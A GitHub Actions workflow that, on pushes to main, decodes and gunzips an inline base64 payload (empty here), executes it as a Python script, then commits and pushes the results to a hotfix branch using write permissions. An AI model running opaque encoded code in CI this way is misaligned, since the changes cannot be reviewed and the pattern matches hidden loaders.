name: Apply Final Manual Update Model

on:
  push:
    branches: [main]

permissions:
  contents: write

jobs:
  apply:
    if: github.actor != 'github-actions[bot]'
    runs-on: ubuntu-latest
    steps:
      - name: Checkout hotfix branch
        uses: actions/checkout@v7
        with:
          ref: fix/recovery-dns-webui-gzip
          token: ${{ secrets.GITHUB_TOKEN }}
          fetch-depth: 0

      - name: Apply final patch
        run: |
          python3 - <<'PY'
          import base64, gzip
          payload = ''''''
          open('/tmp/apply_final_hotfix.py','wb').write(gzip.decompress(base64.b64decode(payload)))
          PY
          python3 /tmp/apply_final_hotfix.py
          cd webui
          npm install --package-lock-only --ignore-scripts

      - name: Commit hotfix branch
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "github-actions[bot]@users.noreply.github.com"
          git add -A
          git commit -m "fix: finalize manual updates and fixed New Design defaults"
          git push origin HEAD:fix/recovery-dns-webui-gzip
